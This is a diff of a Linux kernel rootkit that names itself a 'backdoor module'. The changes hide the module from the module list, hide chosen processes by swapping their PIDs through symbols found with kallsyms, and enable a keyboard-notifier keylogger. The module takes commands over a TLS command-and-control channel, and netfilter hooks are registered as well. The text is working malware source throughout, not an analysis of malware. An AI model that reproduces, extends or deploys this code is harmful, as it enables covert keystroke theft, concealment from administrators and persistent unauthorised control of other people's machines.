@@ -32,46 +32,9 @@
 #define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
 #endif
 
-int hidden = 0;
-static struct list_head* mod_list;
-
-struct task_pid {
-    struct task_struct* ts;
-    struct pid* p;
-};
-
-static struct task_pid hidden_procs[10];
-int hidden_count = 0;
-
-void hide(void) {
-    if (hidden)
-        return;
-
-    while (!mutex_trylock(&module_mutex))
-        cpu_relax();
-    mod_list = THIS_MODULE->list.prev;
-    list_del(&THIS_MODULE->list);
-    kfree(THIS_MODULE->sect_attrs);
-    THIS_MODULE->sect_attrs = NULL;
-    mutex_unlock(&module_mutex);
-    hidden = 1;
-}
-
-void show(void) {
-    if (!hidden)
-        return;
-
-    while (!mutex_trylock(&module_mutex))
-        cpu_relax();
-    list_add(&THIS_MODULE->list, mod_list);
-    mutex_unlock(&module_mutex);
-    hidden = 0;
-}
-
 static asmlinkage void (*change_pidR)(
         struct task_struct* task, enum pid_type type, struct pid* pid);
 static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
-static asmlinkage void (*my_release_task_stack)(struct task_struct* ts);
 
 struct service {
     struct socket* tls_socket;
@@ -89,6 +52,18 @@ u16* closed_ports;
 size_t open_port_count = 0;
 size_t closed_port_count = 0;
 
+bool hidden = 0;
+static struct list_head* mod_list;
+
+struct task_pid {
+    struct task_struct* ts;
+    struct pid* p;
+};
+
+static struct task_pid hidden_procs[10];
+int hidden_count = 0;
+static rwlock_t* my_tasklist_lock;
+
 int send_msg(struct socket* sock, unsigned char* buf, size_t len);
 int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
 int start_transmit(void);
@@ -96,11 +71,10 @@ int init_userspace_conn(void);
 void UpdateChecksum(struct sk_buff* skb);
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
 
+//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
         .notifier_call = keysniffer_cb,
 };
-
-//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 
 /*
  * Keymap references:
@@ -142,6 +116,35 @@ static const char* us_keymap[][2] = {
         {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 115-118
         {"<PAUSE>", "<PAUSE>"}, // 119
 };
+
+void hide(void) {
+    if (hidden) {
+        return;
+    }
+
+    while (!mutex_trylock(&module_mutex)) {
+        cpu_relax();
+    }
+    mod_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
+    mutex_unlock(&module_mutex);
+    hidden = true;
+}
+
+void show(void) {
+    if (!hidden) {
+        return;
+    }
+
+    while (!mutex_trylock(&module_mutex)) {
+        cpu_relax();
+    }
+    list_add(&THIS_MODULE->list, mod_list);
+    mutex_unlock(&module_mutex);
+    hidden = false;
+}
 
 /*
  * function:
@@ -285,11 +288,8 @@ int read_TLS(void) {
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
     struct task_struct* ts;
-    char proc_name[TASK_COMM_LEN];
     struct pid* newpid;
     struct pid* oldpid;
-    int z = 0;
-    rwlock_t* lo;
 
     while (!kthread_should_stop()) {
         tmp_port = 0;
@@ -332,26 +332,11 @@ int read_TLS(void) {
             strcpy(buffer, clear);
             send_msg(svc->tls_socket, buffer, strlen(clear));
         } else if (memcmp("test", buffer, 4) == 0) {
-#if 0
-            for_each_process(ts) {
-                printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
-                //if (strcmp("userspace.elf", proc_name) == 0) {
-                if (strcmp("/usr/lib/system", proc_name) == 0) {
-                    printk(KERN_INFO "Found my userspace proc\n");
-
-                    //stop_machine(my_change_pid, ts, NULL);
-                    newpid = get_task_pid(ts, PIDTYPE_PID);
-                    //newpid->numbers[0].nr = 76831 + z++;
-                    newpid->numbers[0].nr = 76831;
-                }
-            }
-#else
             if (hidden) {
                 show();
             } else {
                 hide();
             }
-#endif
         } else if (memcmp("hide", buffer, 4) == 0) {
             if (kstrtou16(buffer + 5, 10, &tmp_port)) {
                 strcpy(buffer, bad_port);
@@ -359,22 +344,9 @@ int read_TLS(void) {
                 continue;
             }
             for_each_process(ts) {
-                //printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
-                //if (strcmp("userspace.elf", proc_name) == 0) {
                 if (ts->pid == tmp_port) {
                     printk(KERN_INFO "Hiding PID %d\n", tmp_port);
-
-                    //newpid = get_task_pid(ts, PIDTYPE_PID);
-                    //newpid->numbers[0].nr = 761;
-
-                    lo = kallsyms_lookup_name("tasklist_lock");
-                    write_lock(lo);
-
-                    if (lo) {
-                        printk(KERN_INFO "Found my lock\n");
-                    } else {
-                        printk(KERN_INFO "Bad lookup name\n");
-                    }
+                    write_lock(my_tasklist_lock);
 
                     //Increment refcount and store reference to original pid struct
                     oldpid = get_pid(get_task_pid(ts, PIDTYPE_PID));
@@ -387,7 +359,7 @@ int read_TLS(void) {
                     hidden_procs[hidden_count].p = oldpid;
                     ++hidden_count;
 
-                    write_unlock(lo);
+                    write_unlock(my_tasklist_lock);
                 }
             }
         } else {
@@ -563,15 +535,6 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
     return NOTIFY_OK;
 }
 
-int my_change_pid(void* data) {
-#if 0
-    struct task_struct* ts = data;
-    struct pid *newpid = get_task_pid(ts, PIDTYPE_PID);
-    newpid->numbers[0].nr = 76831;
-#endif
-    return 0;
-}
-
 /*
  * function:
  *    mod_init
@@ -587,19 +550,11 @@ int my_change_pid(void* data) {
  */
 static int __init mod_init(void) {
     int err;
-    struct task_struct* ts;
-    char proc_name[TASK_COMM_LEN];
-    struct pid* newpid;
 
-    change_pidR = kallsyms_lookup_name("change_pid");
-    alloc_pidR = kallsyms_lookup_name("alloc_pid");
-#if 0
-    my_release_task_stack = kallsyms_lookup_name("release_task_stack");
-    if (!my_release_task_stack) {
-        printk(KERN_ALERT "Unable to find task stack symbol\n");
-        return -1;
-    }
-#endif
+    change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
+            "change_pid");
+    alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
+    my_tasklist_lock = (rwlock_t *) kallsyms_lookup_name("tasklist_lock");
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -634,30 +589,7 @@ static int __init mod_init(void) {
 
     printk(KERN_ALERT "backdoor module loaded\n");
 
-#if 0
-    for_each_process(ts) {
-        printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
-        if (strcmp("userspace.elf", proc_name) == 0) {
-            printk(KERN_INFO "Found my userspace proc\n");
-
-#if 0
-            write_lock(&tasklist_lock);
-
-            //newpid = alloc_pidR(task_active_pid_ns(ts));
-            newpid = get_task_pid(ts, PIDTYPE_PID);
-            newpid->numbers[0].nr = 76831;
-            //newpid->numbers[0].ns = task_active_pid_ns(ts);
-            //change_pidR(ts, PIDTYPE_PID, newpid);
-
-            write_unlock(&tasklist_lock);
-#else
-            stop_machine(my_change_pid, ts, NULL);
-#endif
-        }
-    }
-#endif
-
-    //register_keyboard_notifier(&keysniffer_blk);
+    register_keyboard_notifier(&keysniffer_blk);
 
     return 0;
 }
@@ -677,28 +609,10 @@ static int __init mod_init(void) {
  */
 static void __exit mod_exit(void) {
     int i;
-    rwlock_t* lo;
-    lo = kallsyms_lookup_name("tasklist_lock");
-    write_lock(lo);
-
-    for (i = 0; i < hidden_count; ++i) {
-#if 0
-        hidden_procs[i]->state = TASK_DEAD;
-        my_release_task_stack(hidden_procs[i]);
-        free_task(hidden_procs[i]);
-#else
-        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
-
-        //Decrement the refcount to reset pid struct
-        put_pid(hidden_procs[i].p);
-        force_sig(SIGKILL, hidden_procs[i].ts);
-#endif
-    }
-
-    write_unlock(lo);
-
     nf_unregister_net_hook(&init_net, &nfho);
     nf_unregister_net_hook(&init_net, &nfhi);
+
+    unregister_keyboard_notifier(&keysniffer_blk);
 
     if (svc) {
         if (svc->tls_socket) {
@@ -717,7 +631,16 @@ static void __exit mod_exit(void) {
     if (closed_ports) {
         kfree(closed_ports);
     }
-    //unregister_keyboard_notifier(&keysniffer_blk);
+
+    write_lock(my_tasklist_lock);
+    for (i = 0; i < hidden_count; ++i) {
+        change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
+        //Decrement the refcount to reset pid struct
+        put_pid(hidden_procs[i].p);
+        force_sig(SIGKILL, hidden_procs[i].ts);
+    }
+    write_unlock(my_tasklist_lock);
+
     printk(KERN_ALERT "removed backdoor module\n");
 }
 
